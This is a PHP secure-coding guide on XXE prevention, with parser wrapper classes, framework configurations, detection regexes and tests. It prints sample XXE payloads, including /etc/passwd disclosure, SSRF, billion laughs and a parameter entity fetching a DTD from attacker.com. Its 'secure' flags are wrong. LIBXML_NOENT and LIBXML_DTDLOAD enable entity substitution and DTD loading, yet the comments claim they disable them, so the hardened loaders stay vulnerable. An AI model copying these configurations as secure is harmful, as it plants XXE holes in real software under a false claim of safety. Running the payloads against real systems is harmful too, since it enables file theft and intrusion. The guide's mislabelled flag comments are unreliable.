# XXE (XML External Entity) Prevention

## Understanding XXE

### Attack Vectors

```xml
<!-- File Disclosure -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- SSRF (Server-Side Request Forgery) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/api/secret">
]>
<data>&xxe;</data>

<!-- Billion Laughs (DoS) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>

<!-- Parameter Entity Attack -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>
```

## PHP XML Library Security

### DOMDocument

```php
<?php

declare(strict_types=1);

final class SecureXmlLoader
{
    /**
     * Secure DOMDocument loading
     */
    public static function loadDom(string $xml): DOMDocument
    {
        // PHP < 8.0: Disable entity loader
        if (PHP_VERSION_ID < 80000) {
            $previousValue = libxml_disable_entity_loader(true);
        }

        // Clear any previous libxml errors
        libxml_clear_errors();
        $previousUseErrors = libxml_use_internal_errors(true);

        try {
            $dom = new DOMDocument();
            $dom->preserveWhiteSpace = false;

            // Secure flags
            $flags = LIBXML_NONET          // Disable network access
                   | LIBXML_NOENT          // Substitute entities
                   | LIBXML_DTDLOAD        // Don't load external DTD
                   | LIBXML_DTDATTR        // Don't process DTD attributes
                   | LIBXML_PARSEHUGE;     // Enable large doc parsing safely

            $success = $dom->loadXML($xml, $flags);

            if (!$success) {
                $errors = libxml_get_errors();
                throw new \InvalidArgumentException(
                    'Invalid XML: ' . ($errors[0]->message ?? 'Unknown error')
                );
            }

            return $dom;
        } finally {
            libxml_use_internal_errors($previousUseErrors);
            libxml_clear_errors();

            if (PHP_VERSION_ID < 80000 && isset($previousValue)) {
                libxml_disable_entity_loader($previousValue);
            }
        }
    }

    /**
     * Load XML file securely
     */
    public static function loadFile(string $path): DOMDocument
    {
        if (!file_exists($path)) {
            throw new \InvalidArgumentException("File not found: $path");
        }

        $xml = file_get_contents($path);
        if ($xml === false) {
            throw new \RuntimeException("Could not read file: $path");
        }

        return self::loadDom($xml);
    }
}
```

### SimpleXML

```php
<?php

declare(strict_types=1);

final class SecureSimpleXml
{
    /**
     * Secure SimpleXML loading
     */
    public static function load(string $xml): SimpleXMLElement
    {
        if (PHP_VERSION_ID < 80000) {
            $previousValue = libxml_disable_entity_loader(true);
        }

        $previousUseErrors = libxml_use_internal_errors(true);

        try {
            $flags = LIBXML_NONET | LIBXML_NOENT | LIBXML_DTDLOAD;

            $element = simplexml_load_string($xml, SimpleXMLElement::class, $flags);

            if ($element === false) {
                $errors = libxml_get_errors();
                throw new \InvalidArgumentException(
                    'Invalid XML: ' . ($errors[0]->message ?? 'Unknown error')
                );
            }

            return $element;
        } finally {
            libxml_use_internal_errors($previousUseErrors);
            libxml_clear_errors();

            if (PHP_VERSION_ID < 80000 && isset($previousValue)) {
                libxml_disable_entity_loader($previousValue);
            }
        }
    }

    /**
     * Load from file securely
     */
    public static function loadFile(string $path): SimpleXMLElement
    {
        if (PHP_VERSION_ID < 80000) {
            $previousValue = libxml_disable_entity_loader(true);
        }

        $previousUseErrors = libxml_use_internal_errors(true);

        try {
            $flags = LIBXML_NONET | LIBXML_NOENT | LIBXML_DTDLOAD;

            $element = simplexml_load_file($path, SimpleXMLElement::class, $flags);

            if ($element === false) {
                throw new \InvalidArgumentException("Could not load XML file: $path");
            }

            return $element;
        } finally {
            libxml_use_internal_errors($previousUseErrors);

            if (PHP_VERSION_ID < 80000 && isset($previousValue)) {
                libxml_disable_entity_loader($previousValue);
            }
        }
    }
}
```

### XMLReader

```php
<?php

declare(strict_types=1);

final class SecureXmlReader
{
    public static function create(string $xml): XMLReader
    {
        $reader = new XMLReader();

        // Set secure parser properties BEFORE loading
        $reader->setParserProperty(XMLReader::SUBST_ENTITIES, false);
        $reader->setParserProperty(XMLReader::LOADDTD, false);

        // Use memory stream for string input
        $reader->XML($xml, 'UTF-8', LIBXML_NONET | LIBXML_NOENT);

        return $reader;
    }

    public static function openFile(string $path): XMLReader
    {
        $reader = new XMLReader();

        $reader->setParserProperty(XMLReader::SUBST_ENTITIES, false);
        $reader->setParserProperty(XMLReader::LOADDTD, false);

        $reader->open($path, 'UTF-8', LIBXML_NONET | LIBXML_NOENT);

        return $reader;
    }
}
```

## Framework-Specific Solutions

### Symfony Serializer

```php
use Symfony\Component\Serializer\Encoder\XmlEncoder;

// Secure configuration
$encoder = new XmlEncoder([
    XmlEncoder::LOAD_OPTIONS => LIBXML_NONET | LIBXML_NOENT | LIBXML_DTDLOAD,
]);

// Usage
$data = $encoder->decode($xml, 'xml');
```

### TYPO3 Core

```php
// TYPO3 provides secure XML utilities
use TYPO3\CMS\Core\Utility\GeneralUtility;

// Use T3 XML conversion (internally secured)
$array = GeneralUtility::xml2array($xmlString);

// Or the newer approach
use TYPO3\CMS\Core\Xml\XmlParser;

$parser = GeneralUtility::makeInstance(XmlParser::class);
$data = $parser->parse($xmlString);
```

### Doctrine XML Metadata

```php
// Doctrine uses XMLReader securely by default in v3+
// No special configuration needed

// For custom XML loading in entities
use Doctrine\ORM\Mapping as ORM;

#[ORM\Entity]
#[ORM\Table(name: 'documents')]
class Document
{
    // Store XML as TEXT, parse securely when needed
    #[ORM\Column(type: 'text')]
    private string $xmlContent;

    public function getParsedXml(): SimpleXMLElement
    {
        return SecureSimpleXml::load($this->xmlContent);
    }
}
```

## Detection Patterns

### Static Analysis

```php
// Patterns to search for (vulnerable)
$vulnerablePatterns = [
    'DOMDocument->load',
    'DOMDocument->loadXML',
    'simplexml_load_string',
    'simplexml_load_file',
    'XMLReader->open',
    'XMLReader->XML',
    'xml_parse',
    'DOMDocument->loadHTML',  // Can also be vulnerable
];

// Without these mitigations
$requiredMitigations = [
    'libxml_disable_entity_loader',
    'LIBXML_NONET',
    'LIBXML_NOENT',
    'LIBXML_DTDLOAD',
];
```

### Runtime Detection

```php
/**
 * Check if XML contains potentially malicious content
 */
function containsXxePatterns(string $xml): bool
{
    $dangerousPatterns = [
        '/<!ENTITY\s+/i',           // Entity declarations
        '/<!DOCTYPE\s+.*\[/is',     // DTD with internal subset
        '/SYSTEM\s+["\']/',         // SYSTEM keyword
        '/PUBLIC\s+["\']/',         // PUBLIC keyword
        '/<!NOTATION\s+/i',         // Notation declarations
        '/%[a-zA-Z_]+;/',           // Parameter entities
    ];

    foreach ($dangerousPatterns as $pattern) {
        if (preg_match($pattern, $xml)) {
            return true;
        }
    }

    return false;
}

// Pre-validation before parsing
public function safeLoad(string $xml): SimpleXMLElement
{
    if (containsXxePatterns($xml)) {
        throw new SecurityException('Potentially malicious XML content detected');
    }

    return SecureSimpleXml::load($xml);
}
```

## Testing for XXE

### Unit Tests

```php
<?php

declare(strict_types=1);

namespace Tests\Security;

use PHPUnit\Framework\TestCase;

final class XxePreventionTest extends TestCase
{
    public function testRejectsExternalEntityPayload(): void
    {
        $maliciousXml = <<<XML
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
XML;

        $this->expectException(\Exception::class);
        SecureXmlLoader::loadDom($maliciousXml);
    }

    public function testRejectsSsrfPayload(): void
    {
        $maliciousXml = <<<XML
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<data>&xxe;</data>
XML;

        $this->expectException(\Exception::class);
        SecureXmlLoader::loadDom($maliciousXml);
    }

    public function testRejectsBillionLaughs(): void
    {
        $maliciousXml = <<<XML
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;">
]>
<data>&lol2;</data>
XML;

        $this->expectException(\Exception::class);
        SecureXmlLoader::loadDom($maliciousXml);
    }

    public function testAcceptsValidXml(): void
    {
        $validXml = <<<XML
<?xml version="1.0"?>
<data>
    <item id="1">Test</item>
</data>
XML;

        $dom = SecureXmlLoader::loadDom($validXml);
        $this->assertInstanceOf(DOMDocument::class, $dom);
    }
}
```

### Integration Tests

```php
public function testXmlImportEndpointRejectsXxe(): void
{
    $maliciousXml = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>';

    $response = $this->client->request('POST', '/api/import/xml', [
        'body' => $maliciousXml,
        'headers' => ['Content-Type' => 'application/xml'],
    ]);

    $this->assertEquals(400, $response->getStatusCode());
    $this->assertStringContainsString('Invalid XML', $response->getContent());
}
```

## Remediation Priority

| Severity | Action | Timeline |
|----------|--------|----------|
| Critical | Disable external entities in all XML parsing | Immediate |
| High | Add input validation for XML content | 24 hours |
| Medium | Implement secure wrapper classes | 1 week |
| Low | Add comprehensive test coverage | 2 weeks |
